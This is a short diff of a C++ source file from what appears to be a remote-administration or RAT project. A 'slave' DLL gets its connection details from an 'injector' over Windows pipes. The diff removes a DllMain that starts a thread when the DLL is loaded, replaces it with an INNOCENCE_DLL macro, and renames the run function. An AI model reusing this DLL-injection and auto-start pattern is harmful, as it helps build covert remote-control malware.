@@ -5,15 +5,11 @@ HANDLE threadHandle;
 #include <log/Log.hpp>
 #include <system/Uac.hpp>
 #include <system/Process.hpp>
+#include <network/Pipe.hpp>
 using namespace System;
 
 #include "SlaveCore.hpp"
 
-#include <network/Pipe.hpp>
-
-// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
-// nous envoyer l'injecteur
-// pour ce faire, on utilise les "pipe" à la windows (IPC)
 Common::ConnectionInfo getConnectionInfo()
 {
 	Common::ConnectionInfo info;
@@ -52,7 +48,7 @@ Common::ConnectionInfo getConnectionInfo()
 	return info;
 }
 
-DWORD WINAPI run(void)
+DWORD WINAPI subdll(void)
 {
 	try
 	{
@@ -94,20 +90,4 @@ DWORD WINAPI run(void)
 	return EXIT_SUCCESS;
 }
 
-extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
-{
-    UNREFERENCED_PARAMETER( hModule );
-    UNREFERENCED_PARAMETER( lpReserved );
-
-    switch( dwMsg )
-    {
-		case DLL_PROCESS_ATTACH:
-			DisableThreadLibraryCalls( hModule );
-			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
-			return (!threadHandle) ? FALSE : TRUE;
-		case DLL_PROCESS_DETACH:
-			TerminateThread(threadHandle, EXIT_SUCCESS);
-			return TRUE;
-    }
-    return TRUE;
-}
+INNOCENCE_DLL
